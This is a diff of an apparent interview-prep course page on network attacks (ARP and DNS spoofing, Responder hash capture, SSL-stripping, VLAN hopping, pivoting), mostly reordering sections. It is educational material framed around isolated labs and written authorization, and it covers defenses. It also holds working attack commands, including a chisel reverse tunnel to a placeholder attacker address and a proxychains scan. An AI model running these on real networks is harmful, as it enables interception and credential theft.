@@ -1,30 +1,42 @@
 window.PREP_SITE.registerTopic({
-  id: 'eh-network',
-  module: 'eh',
-  title: 'Network Attacks',
-  estimatedReadTime: '29 min',
-  tags: ['ethical-hacking', 'security', 'pentest', 'network', 'mitm', 'arp-spoofing', 'sniffing', 'responder', 'pivoting'],
+  id: "eh-network",
+  module: "eh",
+  title: "Network Attacks",
+  estimatedReadTime: "29 min",
+  tags: ["ethical-hacking","security","pentest","network","mitm","arp-spoofing","sniffing","responder","pivoting"],
   sections: [
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'tldr', title: '🎯 TL;DR', collapsible: false, html: `
-<div class="callout danger">
-  <div class="callout-title">⚠️ These techniques touch every host on the segment, not just your target</div>
-  <p>Everything in this topic — ARP spoofing, DNS spoofing, Responder's LLMNR/NBT-NS poisoning, SSL-stripping — works by lying to a shared, trust-based network protocol. Once you turn one on, <strong>every device on that broadcast/collision domain sees the effect</strong>, not just an agreed-upon target. That makes these techniques both unusually powerful and unusually risky to run outside a lab: they can degrade or break connectivity for people who were never in scope. Only ever run them on your own isolated lab network (built in Foundations, Ethics &amp; Legal) or under a written Rules of Engagement that <em>explicitly</em> names network-wide ARP/DNS poisoning as an in-scope, authorized technique, ideally in an agreed low-traffic window.</p>
+{ id: "revision", title: "⚡ Revision — Points to Remember", collapsible: false, html: `
+<div class="revision-card">
+  <h4>In one line</h4>
+  <div class="revision-oneline">Post-foothold Layer 2/3 attacks abuse trust-based LAN protocols following one pattern — gain position, gain visibility, take action — and every one of them touches every host on the segment, not just your target.</div>
+  <h4>Key points</h4>
+  <ul>
+    <li>These abuse protocols that assume a trusted LAN: ARP has no authentication at all, and LLMNR/NBT-NS are legacy Windows broadcast name-resolution fallbacks where whoever answers first is believed.</li>
+    <li>On a switched network, passive sniffing shows almost nothing beyond broadcasts (ARP, DHCP, LLMNR/NBT-NS) — to see another host's unicast traffic you must actively insert yourself into its path.</li>
+    <li>ARP spoofing (cache poisoning) forges ARP replies to both the victim and the gateway to become man-in-the-middle; IP forwarding must be enabled or the MITM becomes an accidental denial-of-service.</li>
+    <li>Sniffing tools: Wireshark (GUI), tcpdump and tshark (CLI); capture filters use BPF syntax (<code>-f</code>) and discard before disk, display filters use Wireshark syntax (<code>-Y</code>) after capture.</li>
+    <li>MITM tools: arpspoof (dsniff suite, needs both directions), ettercap (one command, both directions), and bettercap (modern, modular, caplet-driven).</li>
+    <li>DNS spoofing is a follow-on from an existing MITM position: answer the victim's DNS queries with an attacker-controlled address.</li>
+    <li>Responder needs no MITM position — it answers LLMNR/NBT-NS/mDNS broadcast fallbacks and its rogue servers capture NTLMv2 hashes (crack with <code>hashcat -m 5600</code>); often the fastest win on an internal Windows/AD assessment.</li>
+    <li>SSL-stripping downgrades HTTPS to HTTP from a MITM position but is largely defeated by HSTS preload — it only works against non-preloaded, first-visit, or internal-only domains now.</li>
+    <li>VLAN hopping breaks segmentation via switch misconfig: switch spoofing (DTP trunk negotiation, bidirectional) or double tagging (stacked 802.1Q tags, one-way, needs the trunk's native VLAN).</li>
+    <li>Pivoting uses a controlled host with a foot in an unreachable segment as a relay — <code>ssh -D</code> + proxychains, Metasploit <code>autoroute</code>/<code>socks_proxy</code>, or chisel reverse tunnels.</li>
+    <li>These sit in the Exploitation and early Post-Exploitation stages and put availability (a leg of the CIA triad) at real risk across the whole segment — which is why RoE documents name them specifically.</li>
+    <li>Defenses: Dynamic ARP Inspection (with DHCP snooping), port security, disabling LLMNR/NBT-NS via GPO, network segmentation and disabling DTP, and SMB signing to defeat NTLM relay.</li>
+  </ul>
+  <h4>Common trap</h4>
+  <div class="revision-trap">Responder does not need a MITM position — unlike ARP/DNS spoofing it just answers broadcast fallback queries. And capturing an NTLMv2 hash is not the same as relaying it: SMB signing stops a captured hash from being relayed into a live session even when the capture itself succeeds.</div>
+  <h4>Say this in the interview</h4>
+  <div class="revision-say">"Nearly every network attack here is one step of the same pattern: gain position, gain visibility, take action."</div>
+  <div class="revision-say">"On a switched network passive sniffing shows nothing useful — ARP spoofing exists to manufacture the position that lets you see other hosts' traffic."</div>
+  <div class="revision-say">"Responder is usually the fastest win on an internal Windows network because LLMNR and NBT-NS are on by default and typos trigger the broadcast fallback constantly."</div>
 </div>
-<p>This topic covers the classic <strong>Layer 2/3 attacks a tester runs after they already have a foothold on a network</strong> — plugged into a jack, joined to Wi-Fi, or sitting on a compromised host — and wants to turn that position into visibility or credentials. The throughline is a three-step pattern repeated with different tools: <strong>gain position</strong> (insert yourself into traffic flow), <strong>gain visibility</strong> (sniff what flows through you), <strong>take action</strong> (capture credentials, downgrade a connection, or move further into the network).</p>
-<ul>
-  <li><strong>Sniffing</strong> — <strong>Wireshark</strong>, <code>tcpdump</code>, and <code>tshark</code> capture and filter raw traffic once you can see it.</li>
-  <li><strong>MITM &amp; ARP spoofing</strong> — <code>bettercap</code>, <code>ettercap</code>, and <code>arpspoof</code> poison ARP caches to insert yourself between a victim and the gateway on a switched network, where passive sniffing alone sees nothing useful.</li>
-  <li><strong>DNS spoofing</strong> — once in a MITM position, answer a victim's DNS queries with an attacker-controlled address instead of the real one.</li>
-  <li><strong><code>Responder</code></strong> — poisons legacy, unauthenticated Windows name-resolution broadcasts (LLMNR, NBT-NS, mDNS) to harvest NTLMv2 password hashes without any MITM position at all — often the single fastest win on an internal Windows network assessment.</li>
-  <li><strong>SSL-stripping, VLAN hopping, and pivoting</strong> — a downgrade-HTTPS-to-HTTP concept (increasingly blunted by HSTS), a way to jump between VLANs that should be isolated, and the basic technique for using one compromised host as a relay into a network segment you can't reach directly.</li>
-</ul>
-<p><strong>Mantra:</strong> "Position, then visibility, then action — and every one of those three steps is loud enough to affect a whole network segment, so it only ever happens inside a lab or an explicit written scope."</p>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'what-why', title: '🧠 What & Why', html: `
+{ id: "what-why", title: "🧠 What & Why", collapsible: true, html: `
 <h3>Why LAN protocols are such an easy target</h3>
 <p>Most of the protocols this topic abuses were designed in an era, and for an assumption, where every device on a local network could be trusted: <strong>ARP</strong> (Address Resolution Protocol) has no authentication at all — any host can claim to own any IP address, and everyone else just believes the most recent answer. <strong>LLMNR</strong> (Link-Local Multicast Name Resolution) and <strong>NBT-NS</strong> (NetBIOS Name Service) are legacy Windows fallback name-resolution protocols that broadcast "does anyone know this hostname?" to the whole segment when DNS fails to resolve a name — and, again, whichever host answers first wins, no authentication required. A single foothold on a flat, unsegmented network can often abuse this cooperative trust to see or intercept traffic that was never actually defended against a device already sitting on the "inside."</p>
 
@@ -48,10 +60,10 @@ window.PREP_SITE.registerTopic({
 
 <h3>Pivoting: turning one foothold into reach</h3>
 <p>Real networks are segmented specifically so that compromising one host doesn't hand over the whole environment. <strong>Pivoting</strong> is the technique of using a host you already control — one that happens to also have a network interface into a segment you can't reach directly — as a relay, tunneling further attack traffic through it. It's the bridge between "I have one box" and "I can reach the rest of the internal network," and it's the introduction here to a subject that Post-Exploitation &amp; Privilege Escalation builds on in much more depth.</p>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'mental-model', title: '🗺️ Mental Model', html: `
+{ id: "mental-model", title: "🗺️ Mental Model", collapsible: true, html: `
 <h3>Position → Visibility → Action</h3>
 <p>Nearly every technique in this topic is one step of the same three-step pattern. Keep this framing and the specific tools slot in naturally:</p>
 <pre><code class="language-text">1. POSITION      2. VISIBILITY        3. ACTION
@@ -99,10 +111,10 @@ and the illusion intact instead of just breaking connectivity.</code></pre>
 
 <h3>Why this all maps onto the eh-foundations lifecycle</h3>
 <p>These techniques sit squarely in the <strong>Exploitation</strong> and early <strong>Post-Exploitation</strong> stages of the engagement lifecycle from Foundations, Ethics &amp; Legal — they assume Reconnaissance and Scanning &amp; Enumeration already told you there's a reachable network segment worth standing on, and they exist to turn "I'm on this network" into "I have credentials" or "I can reach the next segment." Every technique here also puts <strong>availability</strong> (one leg of the CIA triad) at real risk — a botched ARP-spoof session without IP forwarding, or an aggressive VLAN-hopping attempt against a fragile switch, can knock real users offline — which is exactly why Rules of Engagement documents call these out by name rather than leaving them implied.</p>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'mechanics', title: '⚙️ Tools & Techniques', html: `
+{ id: "mechanics", title: "⚙️ Tools & Techniques", collapsible: true, html: `
 <h3>Sniffing: Wireshark, tcpdump, tshark</h3>
 <p><strong>Capture filters</strong> (applied while capturing — BPF syntax, shared by <code>tcpdump</code> and <code>tshark -f</code>) discard traffic before it's even written to disk; <strong>display filters</strong> (Wireshark's filter bar, and <code>tshark -Y</code>) filter what's already captured and support much richer expressions.</p>
 <pre><code class="language-bash"># tcpdump — capture filters (BPF syntax)
@@ -207,10 +219,10 @@ msf6&gt; use auxiliary/server/socks_proxy
 # foothold host dials out and exposes a SOCKS proxy back to the attacker):
 chisel server -p 8080 --reverse                  # on the attacker box
 chisel client &lt;attacker-ip&gt;:8080 R:socks         # on the foothold host</code></pre>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'examples', title: '🧪 Worked Examples', html: `
+{ id: "examples", title: "🧪 Examples", collapsible: true, html: `
 <h3>Example 1 — From passive sniffing to an active ARP-spoof MITM (isolated lab network)</h3>
 <p>Continuing the isolated host-only lab from Foundations, Ethics &amp; Legal, using a Kali attacker VM and a Metasploitable target VM, both pinned to the same lab-only network:</p>
 <pre><code class="language-bash"># 1. Confirm the lab-only addressing before touching anything:
@@ -275,10 +287,10 @@ proxychains nmap -sT -Pn 192.168.90.0/24
 # → discovers hosts on 192.168.90.0/24 despite Kali having no direct route —
 #   this is the same "one host becomes a relay" idea Post-Exploitation &amp;
 #   Privilege Escalation later builds into full lateral-movement chains.</code></pre>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'interview-patterns', title: '🎤 Interview Patterns', html: `
+{ id: "interview-qa", title: "🎤 Interview Q&A", collapsible: true, html: `
 <div class="qa-block">
 <div class="qa-q">Walk me through how ARP spoofing creates a man-in-the-middle position.</div>
 <div class="qa-a">
@@ -320,10 +332,10 @@ proxychains nmap -sT -Pn 192.168.90.0/24
 <p>Pivoting is using a host you already control — one that also has network access into a segment you can't reach directly — as a relay to route further attack traffic into that otherwise-unreachable segment. Common mechanisms: an SSH dynamic port forward (<code>ssh -D</code>) turns the foothold host into a local SOCKS proxy that tools can be routed through via <code>proxychains</code>; inside Metasploit, an active session's <code>autoroute</code> adds a route through it and <code>auxiliary/server/socks_proxy</code> exposes that route to external tools; and tools like <code>chisel</code> establish reverse tunnels that work even through restrictive firewalls or NAT, where the foothold host dials out to the attacker rather than the other way around. It's the technique that turns "I compromised one machine" into "I can reach the rest of the internal network," and it's built on in much more depth in Post-Exploitation &amp; Privilege Escalation.</p>
 </div>
 </div>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'cheat-sheet', title: '📋 Cheat Sheet', html: `
+{ id: "cheat-sheet", title: "📋 Cheat Sheet", collapsible: true, html: `
 <table>
   <thead><tr><th>Category</th><th>Tool / Technique</th><th>What it does / key command</th></tr></thead>
   <tbody>
@@ -347,10 +359,11 @@ proxychains nmap -sT -Pn 192.168.90.0/24
     <tr><td>Legal must-have</td><td>Explicit written scope</td><td>Network-wide MITM/poisoning named explicitly in the RoE, or lab-only — never assumed in-scope by default</td></tr>
   </tbody>
 </table>
-`},
+` },
 
 // ─────────────────────────────────────────────────────────────
-{ id: 'edge-cases', title: '⚠️ Defenses & Legal', html: `
+{ id: "pitfalls", title: "🕳️ Pitfalls", collapsible: true, html: `<div class="pitfalls-part">🕳️ Edge cases</div>
+
 <div class="callout danger">
   <div class="callout-title">⚠️ Authorization for these techniques must be explicit, not implied</div>
   <p>ARP spoofing, DNS spoofing, and LLMNR/NBT-NS poisoning affect every host on the broadcast/collision domain they're run against — including devices, users, and services that were never part of the agreed scope. Per the Rules of Engagement guidance in Foundations, Ethics &amp; Legal, a generic "network testing authorized" scope statement is <strong>not</strong> sufficient authorization for these — the RoE should name network-wide MITM/poisoning techniques explicitly, ideally with an agreed low-traffic testing window, precisely because they put availability (one leg of the CIA triad) at real risk for people outside the test. Outside of an engagement, keep every example in this topic on your own isolated lab network.</p>
@@ -373,50 +386,7 @@ proxychains nmap -sT -Pn 192.168.90.0/24
 
 <h3>Authorization is the constant</h3>
 <p>None of the defenses above change the core rule from Foundations, Ethics &amp; Legal: only run any technique from this topic against systems you own, or that you have explicit, written, in-scope authorization to test — with network-wide MITM/poisoning techniques named specifically, given how far their effects reach beyond a single "target."</p>
-`},
+` },
 
-// ─────────────────────────────────────────────────────────────
-{ id: 'revision', title: '⚡ Revision — Points to Remember', collapsible: true, html: `
-<div class="revision-card">
-  <h4>In one line</h4>
-  <div class="revision-oneline">Post-foothold Layer 2/3 attacks abuse trust-based LAN protocols following one pattern — gain position, gain visibility, take action — and every one of them touches every host on the segment, not just your target.</div>
-  <h4>Key points</h4>
-  <ul>
-    <li>These abuse protocols that assume a trusted LAN: ARP has no authentication at all, and LLMNR/NBT-NS are legacy Windows broadcast name-resolution fallbacks where whoever answers first is believed.</li>
-    <li>On a switched network, passive sniffing shows almost nothing beyond broadcasts (ARP, DHCP, LLMNR/NBT-NS) — to see another host's unicast traffic you must actively insert yourself into its path.</li>
-    <li>ARP spoofing (cache poisoning) forges ARP replies to both the victim and the gateway to become man-in-the-middle; IP forwarding must be enabled or the MITM becomes an accidental denial-of-service.</li>
-    <li>Sniffing tools: Wireshark (GUI), tcpdump and tshark (CLI); capture filters use BPF syntax (<code>-f</code>) and discard before disk, display filters use Wireshark syntax (<code>-Y</code>) after capture.</li>
-    <li>MITM tools: arpspoof (dsniff suite, needs both directions), ettercap (one command, both directions), and bettercap (modern, modular, caplet-driven).</li>
-    <li>DNS spoofing is a follow-on from an existing MITM position: answer the victim's DNS queries with an attacker-controlled address.</li>
-    <li>Responder needs no MITM position — it answers LLMNR/NBT-NS/mDNS broadcast fallbacks and its rogue servers capture NTLMv2 hashes (crack with <code>hashcat -m 5600</code>); often the fastest win on an internal Windows/AD assessment.</li>
-    <li>SSL-stripping downgrades HTTPS to HTTP from a MITM position but is largely defeated by HSTS preload — it only works against non-preloaded, first-visit, or internal-only domains now.</li>
-    <li>VLAN hopping breaks segmentation via switch misconfig: switch spoofing (DTP trunk negotiation, bidirectional) or double tagging (stacked 802.1Q tags, one-way, needs the trunk's native VLAN).</li>
-    <li>Pivoting uses a controlled host with a foot in an unreachable segment as a relay — <code>ssh -D</code> + proxychains, Metasploit <code>autoroute</code>/<code>socks_proxy</code>, or chisel reverse tunnels.</li>
-    <li>These sit in the Exploitation and early Post-Exploitation stages and put availability (a leg of the CIA triad) at real risk across the whole segment — which is why RoE documents name them specifically.</li>
-    <li>Defenses: Dynamic ARP Inspection (with DHCP snooping), port security, disabling LLMNR/NBT-NS via GPO, network segmentation and disabling DTP, and SMB signing to defeat NTLM relay.</li>
-  </ul>
-  <h4>Common trap</h4>
-  <div class="revision-trap">Responder does not need a MITM position — unlike ARP/DNS spoofing it just answers broadcast fallback queries. And capturing an NTLMv2 hash is not the same as relaying it: SMB signing stops a captured hash from being relayed into a live session even when the capture itself succeeds.</div>
-  <h4>Say this in the interview</h4>
-  <div class="revision-say">"Nearly every network attack here is one step of the same pattern: gain position, gain visibility, take action."</div>
-  <div class="revision-say">"On a switched network passive sniffing shows nothing useful — ARP spoofing exists to manufacture the position that lets you see other hosts' traffic."</div>
-  <div class="revision-say">"Responder is usually the fastest win on an internal Windows network because LLMNR and NBT-NS are on by default and typos trigger the broadcast fallback constantly."</div>
-</div>
-`},
-
-// ─────────────────────────────────────────────────────────────
-{ id: 'checklist', title: '✅ Interview Checklist', collapsible: true, html: `
-<div class="callout success">
-  <div class="callout-title">Can you answer these before moving on?</div>
-  <ul>
-    <li>Can you explain how ARP spoofing creates a man-in-the-middle position and why IP forwarding matters?</li>
-    <li>Can you say why you can't passively sniff another host's traffic on a switched network?</li>
-    <li>Can you explain LLMNR/NBT-NS poisoning and why Responder is so effective without any MITM position?</li>
-    <li>Can you assess whether SSL-stripping is still a practical attack in the HSTS era?</li>
-    <li>Can you contrast the two VLAN hopping techniques, switch spoofing and double tagging?</li>
-    <li>Can you describe what pivoting is and name the common ways to do it?</li>
-  </ul>
-</div>
-`}
-
-]});
+  ]
+});
